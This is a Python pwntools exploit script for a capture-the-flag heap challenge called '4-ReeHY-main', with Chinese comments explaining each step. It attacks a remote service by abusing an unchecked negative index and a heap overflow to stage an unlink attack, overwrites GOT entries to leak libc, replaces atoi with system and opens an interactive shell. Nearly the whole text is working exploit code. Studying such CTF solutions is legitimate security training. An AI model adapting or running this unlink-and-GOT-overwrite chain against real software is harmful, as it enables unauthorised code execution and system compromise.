from pwn import *  
from LibcSearcher import *  
  
context.log_level = 'debug'  
#sh = process('./4-ReeHY-main')  
#elf = ELF('./4-ReeHY-main')  
#libc = ELF('/ctflibc.so.6')  
  
sh = remote("61.147.171.105",65363)  
  
def welcome():  
   sh.sendlineafter('$','seaase')  
  
def create(size,index,content):  
   sh.sendlineafter('$','1')  
   sh.sendlineafter('Input size\n',str(size))  
   sh.sendlineafter('Input cun\n',str(index))  
   sh.sendafter('Input content\n',content)  
  
def delete(index):  
   sh.sendlineafter('$','2')  
   sh.sendlineafter('Chose one to dele\n',str(index))  
  
def edit(index,content):  
   sh.sendlineafter('$','3')  
   sh.sendlineafter('Chose one to edit\n',str(index))  
   sh.sendafter('Input the content\n',content)  
  
#处理开始  
welcome()  
#先创建两个0x100的堆(不要太大，也不要太小,这样使用unsorted bin)  
create(0x100,0,b'a'*0x100)  
create(0x100,1,b'b'*0x100)  
  
#delete功能没有检查下标越界,delete(-2)就是释放记录4个cun大小的那个堆空间  
delete(-2)  
  
payload = p32(0x200) + p32(0x100)  
#根据堆fastbin的特性，新申请的空间位于刚刚释放的那个小内存处,将覆盖原来的那个内容，相当于qword_6020C0[0] = 0x200，  
#这样功能3 read的时候就可以溢出堆(本来只读取那么多，现在可以多读取0x100字节)  
create(0x14,2,payload)  
  
#现在我们要在第一个堆里构造一个假的堆结构了  
# prev_size        size 末尾的1标志前一个块不空闲  
payload = p64(0) + p64(0x101)  
# FD 和 BK分别是后一个块的指针和前一个块的指针,构成双向链表  
# if (__builtin_expect (FD->bk != P || BK->fd != P, 0))  
#  malloc_printerr (check_action, "corrupted double-linked list", P);  
#为了绕过验证，首先  
# FD = *(P + size + 0x10)  
# BK = *(P - Prev_Size + 0x18)  
# FD->bk = *(P + size + 0x10) - FD->Prev_Size + 0X18  
# BK->fd = *(P - Prev_Size + 0x18) + BK->size + 0x10  
# 上面即检测双向链表的完整性  
# 如果通过  
# unlink里的关键代码  
#   FD->bk = BK;  
#   BK->fd = FD;  
# 我们现在的目的是，利用这两个指针修改的操作，来修改我们想要的位置  
# 这个程序中，在0x6020E0是一个数组，用来保存着4个堆的指针  
# 如果我们想办法把这些堆指针改成某些函数的got表地址，那么我们下次read时，数据就会覆盖got表  
# 因此,如果 (P + size + 0x10) = 0x6020E0 ，(P - Prev_Size + 0x18) = 0x6020E0  
# 即P + size = 0x6020D0，P - Prev_Size = 0x6020C8  
# 即BK = 0x6020D0 ，FD = 0x6020C8  
# 即P->fd = 0x6020C8，P->bk = 0x6020D0  
# 现在，主角是P，我们让第一个堆为主角  
payload += p64(0x6020C8) + p64(0x6020D0)  
#填充满第一个块  
payload += b'a'*(0x100-4*8);  
#溢出到第二个块  
# prev_size   size  
# 对于使用中的块，它的结构是这样的  
# prev_size 8 byte  
# size 8 byte  
#修改第二个块的Prev_Size，造成前一个块被释放的假象  
payload += p64(0x100) + p64(0x100 + 2 * 8)  
#发送payload，修改堆结构  
edit(0,payload)  
#现在我们调用delete(1)释放第二个块，它会和我们伪造的块进行unlink合并  
#  
#   执行  
#   FD->bk = BK;  
#   BK->fd = FD;  
#  
#   即*(0x6020C8+0x18) = 0x6020D0  
#     *(0x6020D0 + 0x10) = 0x6020C8  
#   最终即0x6020E0 = 0x6020C8  
#  这样，由于0x6020E0处是用于保存第1个堆指针的，现在被我们指向了0x6020C8处，于是我们向第1个堆输入数据都会存于这里  
#触发unlink  
delete(1)  
  
elf = ELF('./4-ReeHY-main')  
free_got = elf.got['free']  
puts_got = elf.got['puts']  
atoi_got = elf.got['atoi']  
puts_plt = elf.plt['puts']  
#于是，我们可以根据结构，布局payload来覆盖0x6020E04处的几个堆的指针  
payload = b'\x00'*0x18   #padding  
payload += p64(free_got) + p64(1)  
payload += p64(puts_got) + p64(1)  
payload += p64(atoi_got) + p64(1)  
  
#执行后，前3个堆指针都被我们指向了几个函数的got地址处  
edit(0,payload)  
#修改free的got地址为puts的plt地址  
edit(0,p64(puts_plt))  
#即调用puts_plt(puts_got)，泄露puts的加载地址  
delete(1)  
puts_addr = u64(sh.recv(6).ljust(8,b'\x00'))  
  
print (hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)  
  
libc_base = puts_addr - libc.dump('puts')  
system_addr = libc_base + libc.dump('system');  
#修改atoi的got地址为system的got地址  
edit(2,p64(system_addr))  
  
#get shell  
sh.sendlineafter('$','/bin/sh')  
  
sh.interactive()  